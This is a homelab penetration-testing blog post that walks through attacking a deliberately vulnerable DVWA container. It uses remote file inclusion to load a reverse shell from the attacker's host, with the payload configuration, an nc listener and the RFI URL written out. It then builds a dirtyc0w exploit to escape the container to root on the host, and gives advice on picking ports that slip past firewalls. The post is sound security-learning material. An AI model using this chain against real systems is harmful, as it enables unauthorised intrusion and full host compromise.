---
layout: post
title: Attacking Yourself First
date:   2016-12-27 23:43:12 -0600
Categories: homelab docker webapp pentesting
---

## Why not just attack someone else?

Because it's illegal. 

### Attacking a home lab

If you're doing this on a budget, you have a few ways to go about this. You can either use old machines you have laying around to install OSes and applications on and attack those systems or you can do something virtualized. Since I'm doing this on a budget and don't want to reinstall OSes all day, I'm doing this virtualized. I'll be doing this in docker again because why not, but you could just as easily do something in a VM and snapshot it before you really attack. I also am very interested in how docker and containers complicate breaking into systems, so this is as good of a time as any to figure it out.

For this lab, I'm using a docker container of LAMP and a local installation of Damn Vulnerable Web Applications. Let's first get our docker container.

### OK let's go

I'm working off a different Ubuntu image than I usually work off of because I want to be sure my exploits will work (cheating, I know). If we go [here](http://releases.ubuntu.com/) we can find old version of Ubuntu and it even tags the date they were released. I downloaded and installed Server 14.04.5 and installed a few applications

~~~
<Install the OS, select the SSH Server as the additional functionality>
sudo apt-get install git docker.io
sudo usermod -aG docker $USER
<reboot or log out and back in>
~~~

That's enough believe it or not, the rest will come with our container.

Getting this figured out took longer than I expected, but if you check [my github](https://github.com/remotephone) page you'll see a repo for dvwa-lamp. This is a docker container than includes the [Damn Vulnerable Web App](https://github.com/ethicalhack3r/DVWA) bundled inside a lamp container I forked off [tutum](https://github.com/tutumcloud/lamp).

You can follow the instructions in the README or do just do this:

~~~
git clone https://github.com/remotephone/dvwa-lamp.git
cd dvwa-lamp
docker build -t remotephone/dvwa-lamp .
docker run -d -p 80:80 -p 3306:3306 remotephone/dvwa-lamp 
<wait some seconds and then browse to...>
http://<Victim IP>/setup.php
~~~

And you're set! Install the database by completed the setup and login as admin/password. 

### Explotiation and notes

Now let's get started. We're going to move from a web app to a Docker container and see if we can make it to the host. For the purposes of this demo, I'm going easy mode, we're going to set the security level to "Low" in DVWA Security in the sidebar and then go to the File Inclusion tests.

[Remote File Inclusion](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/) is a nasty vulnerability that allows you to manipulate insecurely coded requests for resources to instead call to resources you control. While the web server may intend to display information from a local file on the webserver, you can instead redirect the webserver to call a file you host and even execute the code if the server knows how to interpret it. One of the most simple examples is tricking a server to  call a php script you host and excuting that to send you a reverse shell.

For this exercise, I'll use [laudunum](https://blog.secureideas.com/2014/01/professionally-evil-software-laudanum.html). While the link for the latest release doesn't work, you can find it in the laudunum package as part of Kali linux. We're going to use the RFI vulnerability to call a webshell we host on our local web server, listen with ncat to catch our reverse shell, use the shell to upload a kernel exploit, and see if we can use that to escape our container. 

To make this work, you need a few things. First, get your container running. Next, get you webshells ready in your /var/www/html directory. I'm using php-reverse-shell.php from the laudunum package and I've updated the file to point back to my attacking server. I always use ports 443 or 80 if possible for reverse shells, firewalls tend to allow this traffic out and it's not suspicious if someone netstats an affected server. This is the part of the webshell I modified:

~~~
$VERSION = "1.0";
$ip = '192.168.1.20';  // CHANGE THIS
$port = 443;       // CHANGE THIS
~~~

It's conveniently marked with "CHANGE THIS" so you know what to update. If you want to change some of the actions under $shell, you can, especially if for some reason bash or sh is not in the /bin/ directory. Now let's get a shell.

### Getting your foot in the door

First we'll go to the File Inclusion page. At this point, my attacking machine has apache running, I've copied and fixed my reverse shell, hosted it in my /var/www/html folder, renamed it something short and easy to call, I've started a nc listener with nc -nlvp 443 and I've browsed to the RFI page (whew). The RFI is easy peasy here, this request in your browser will trigger it:

~~~
http://192.168.1.16/vulnerabilities/fi/?page=http://192.168.1.20/php.txt
~~~

It's important to use the .txt extension since using .php will cause your browser to interpret the script and you'll reverse shell yourself, which isn't as exciting. In this particular page, you can View Source to see the site isn't doing anything to append anything to your requested page, so you don't need to use null characters to terminate the request. 

### Poking Around and Enumeration

Now we've got a reverse shell. Now what? It's time to enumerate. Since I borrowed this container from tutum, there was some learning I had to do. If we enumerate the kernels, we learn that we're running a version that's vulnerable to dirtyc0w. Since the container is simply an "isolated" sandbox on the VM, we can expect it to be running the same kernel version as the VM, and we're right (some IPs might not match in screenshots because I've messed with VMs quite a bit for other stuff since I started this post, but the idea is the same):

![Kernels]({{site.url}}/images/kernels.png){: .center-image }

For giggles, let's run a Centos container and see what it's running under the hood. 

![Centosbuntu]({{site.url}}/images/Centosbuntu.png){: .center-image } 

That's interesting! There's no difference between the kernel in the container and the one in the VM. It'd be interesting to see how important that is for packages that expect to be run in CentOS, but that's kind of outside the scope of what I'm doing. Let's keep moving forward. 

### Picking an Exploit 

We need to pick an exploit that works and gets us to the host. The fact that we're in a container means userspace exploits are useless. Even if you escalate to root inside the container, you still don't own the host. You need to exploit a kernel vulnerability in a way that let's you get out of the confines of the container. 

Lot's of the (dirtyc0w POC's)[https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs] I've seen give you rights to modify files as root and other things, which, even if they do affect the underlying OS, don't give you a way to take advantage of that from your session. Scumjr published an exploit that somewhat reliably allows you to escape the container (here)[https://github.com/scumjr/dirtycow-vdso]. It's glorious. You'll need gcc, make, and nasm installed to compile this. 

(This article)[https://www.aporeto.com/dirty-cow-story-privilege-escalation-vulnerability/] breaks down really well how the exploit we're going to use breaks out of the confines of the container. In short, it manipulates memory space shared between the container and host and tricks processes checking the systemtime in that memory space to trigger the exploit, sending you a shell from the host (pretty sure that's right, tell me if I'm not).

If we have a vulnerable kernel, we need to get our exploit to the box. How do we do that? We could echo it line by line into a file, but that's so painful over a reverse shell. If we check for applications on the server, we are missing things like wget, curl, and fetch. We do have python, perl, so that's nice. If we go a little further and check the /usr/bin directory, we find sftp. That's handy, but it came from an installation of git and openssh-client, which we really can't depend on.

### Living off the land when you're in a desert
 
Check for yourself in a default Ubuntu container, lots of the stuff we'd typically rely on getting files into and out of a server we're in aren't there. No ftp, no tftp, no wget, curl, fetch, etc etc. This complicates getting our exploit code on to the server. Once it's there, you'll find there's usually nothing to compile it either.  

In the spirit of living off the land, let's start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let's see if we can execute arbitrary php. This isn't pretty, but it proves my point, we can execute arbitrary php commands.

![Whiches and php]{{site.url}}/images/whichesphp.png){: .center-image } 
 
So great, we can move stuff in and out, but you can see we can't even compile anything locally once it's on there. I checked a handful of popular containers like the CentOS one, redis, and jenkins and they all come pretty bare. These are some results from redis and jenkins:

![Installed default packages]({{site.url}}/images/whichredisjenkins.png){: .center-image }

I don't really know a lot of ways to deal with this gracefully. If you don't have anything on the system and you can't or don't want to install additional packages, the only option I know is compiling it elsewhere and bringing it to the server. Let's find somewhere we can write to, then we'll use php to bring in our exploit. We need somewhere we can write to, and /tmp is often available. The same is the case here:

~~~
$ ls -asl /tmp
total 8
4 drwxrwxrwt  2 root root 4096 Jan 12 03:21 .
4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
~~~

### Compiling your exploit. 

We already know the kernel version, 4.4.0-31 and we don't have an image laying around with that particular version, but we do have an updated image in an VM we have sitting around. To install the appropriate kernel, we need to find it. Search <distroname> <kernel verison> in google and you'll hopefully find something like [this page](http://packages.ubuntu.com/xenial/amd64/linux-image-4.4.0-31-generic/download) where you can download and install the kernel with:

~~~
dpkg -i linux-image-4.4.0-31-generic_4.4.0-31.50_amd64.deb
~~~
 
You might also need the image-extra or headers package. Reboot into your new kernel, make sure you have the appropriate packages installed, then compile it. If you don't have everything installed, this is the full process:

~~~
sudo apt-get install git nasm make gcc
git clone https://github.com/scumjr/dirtycow-vdso.git
cd dirtycow-vdso
make
~~~

Now move the file off your test system, on to your attacking host and into your /var/www/html folder. From here, you should be able to get into /tmp, pull the file into your victim host, change permissions, run the exploit, and get your shell. Since you're sending a shell back to your container from the host, you need to make sure you send it to the proper IP. By default, the exploit uses 127.0.0.1, which will not work. You only get one chance with this exploit if it goes wrong, so make sure you send it to the docker eth0 and you'll get your shell back as root inside the host!


![Full Escape]({{site.url}}/images/fullescape.png){: .center-image }


And there you go, you've successfully gone from a web application, to a container shell, to a full host escape and root! Sobering stuff.


### Lessons Learned

Containers are not a panacea. They won't mean you're 100% secure, but they do put some difficult restrictions around attackers. Unless they haven't gotten around to patching dirtyc0w (which wouldn't be *that* surprising), you better be sitting on some creative ways of interacting with the kernel if you want to escape a container. As people get better with containers, best practices get better defined, and things like (Clear Linux)[https://clearlinux.org/] really take off, I think it's only going to get more interesting for attackers and pen testers.

Thanks!
